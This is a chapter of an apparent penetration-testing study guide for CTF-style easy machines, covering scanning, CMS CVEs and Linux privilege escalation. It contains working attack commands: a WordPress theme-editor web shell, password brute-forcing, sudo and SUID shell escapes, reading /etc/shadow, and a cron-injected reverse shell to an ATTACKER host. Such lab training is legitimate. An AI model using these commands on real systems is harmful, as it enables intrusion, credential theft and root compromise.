[◀ Prev: Linux PrivEsc](06-linux-privesc.md) · [🏠 Index](README.md) · [Next: Medium Machines ▶](08-medium-machines.md)

---

# 07 · 🟢 Easy Machines — Complete Methodology

> [!NOTE]
> **Easy machine mindset.** Easy machines typically have 1–2 step footholds using publicly known CVEs, default credentials, or simple web vulnerabilities. Privilege escalation is usually a single misconfiguration — often `sudo -l`, a SUID binary, or a basic cron job. If you are spending more than 30 minutes without progress, you have almost certainly missed something in enumeration. Go back and scan more thoroughly.

## 7.1 Easy Machine — Standard Attack Workflow

| Step | Action | Expected Finding | Time Budget |
| --- | --- | --- | --- |
| 1 | Fast full port scan (`nmap -p- --min-rate 5000`) | 1–3 open ports typically (80, 22 common) | 2–3 min |
| 2 | Service scan on discovered ports (`-sV -sC`) | Apache/nginx version, SSH version | 2 min |
| 3 | Web fingerprint + directory fuzz | `/admin`, `/uploads`, CMS detection | 5–10 min |
| 4 | Service-specific exploitation | Public CVE, default creds, SQLi | 10–20 min |
| 5 | Reverse shell → stabilise | www-data or app user shell | 5 min |
| 6 | `sudo -l` and SUID check | NOPASSWD entry or unusual SUID | 2 min |
| 7 | GTFOBins escalation | Root shell | 5 min |

## 7.2 Common Easy Machine Foothold Vectors

### Apache/Nginx Web Server

```bash
# Step 1: Basic web recon
whatweb http://$TARGET
curl -s http://$TARGET | grep -i 'wordpress\|joomla\|drupal\|laravel'

# Step 2: Directory enumeration
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Common easy machine paths to check:
#   /admin, /administrator, /login, /wp-admin
#   /backup, /db, /database, /sql
#   /config, /configuration.php, /.env, /config.php
#   /.git (git repository exposure)

# Step 3: Try default/found credentials
# Step 4: Look for file upload -> RCE, SQLi, LFI
```

### WordPress (Very Common on Easy)

```bash
# WPScan — WordPress vulnerability scanner
wpscan --url http://$TARGET -e u,p,t,ap --api-token YOUR_TOKEN

# Manual WordPress enum
curl http://$TARGET/wp-json/wp/v2/users    # User enumeration
curl http://$TARGET/?author=1              # Author enumeration

# wpscan with password attack
wpscan --url http://$TARGET -U admin -P /usr/share/wordlists/rockyou.txt

# If you get WordPress admin creds -> RCE:
#   Appearance -> Theme Editor -> 404.php -> add PHP shell
#   Or: Plugin Editor -> edit a plugin file
# Trigger:
curl http://$TARGET/wp-content/themes/theme/404.php?cmd=id
```

### CMS-Specific CVEs (Easy Machines Often Use These)

| CMS / Service | CVE | Attack Type | Tool |
| --- | --- | --- | --- |
| Drupal < 8.6.10 | CVE-2019-6340 | RCE via REST API | drupalgeddon2 |
| Drupal < 7.58 | CVE-2018-7600 | Unauthenticated RCE | drupalgeddon2 |
| WordPress ThemeGrill | CVE-2020-8772 | Auth bypass + reset | Metasploit module |
| Pluck CMS 4.7.13 | CVE-2020-8963 | Authenticated file upload | Manual upload |
| Bludit CMS | CVE-2019-16113 | Authenticated RCE | Metasploit/manual |
| Tomcat < 9.0.0.M20 | CVE-2017-12617 | JSP upload via PUT | curl / Metasploit |
| WebLogic 10.3.6 | CVE-2018-2628 | Deserialization RCE | ysoserial |
| Nibbleblog 4.0.3 | — | Authenticated file upload | Manual upload `.php` |

## 7.3 Easy Machine — Privilege Escalation Patterns

### Pattern 1 — sudo -l Single Binary

```bash
sudo -l
# Example output:
#   (ALL : ALL) NOPASSWD: /usr/bin/vim

# Exploitation:
sudo vim -c ':!/bin/bash'

# Or:
#   (ALL) NOPASSWD: /usr/bin/python3 /opt/check.py
# If script imports a module you can overwrite:
echo 'import os; os.system("chmod +s /bin/bash")' > /tmp/os.py

# Or if the script path itself is writable:
echo 'import os; os.system("/bin/bash")' > /opt/check.py
sudo /usr/bin/python3 /opt/check.py
```

### Pattern 2 — Unusual SUID Binary

```bash
find / -perm -u=s -type f 2>/dev/null

# Example unusual SUID found: /usr/bin/base64
# Can read any file as the file owner (if root owns it)
base64 /etc/shadow | base64 -d

# Example: /usr/sbin/getcap
# Example: /usr/bin/xxd
xxd /etc/shadow | xxd -r

# Always check GTFOBins for the specific binary
# https://gtfobins.github.io/gtfobins/[binary]/#suid
```

### Pattern 3 — Simple Cron Script

```bash
# pspy shows: /bin/sh -c /opt/cleanup.sh run every minute as root

# Check if script is writable
ls -la /opt/cleanup.sh
# -rwxrwxrwx root root cleanup.sh <- world-writable!

# Inject reverse shell or SUID bash
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/cleanup.sh
# Start listener and wait for cron

# OR set SUID bit on bash
echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
# After cron runs:
/bin/bash -p
```

---

[◀ Prev: Linux PrivEsc](06-linux-privesc.md) · [🏠 Index](README.md) · [Next: Medium Machines ▶](08-medium-machines.md)
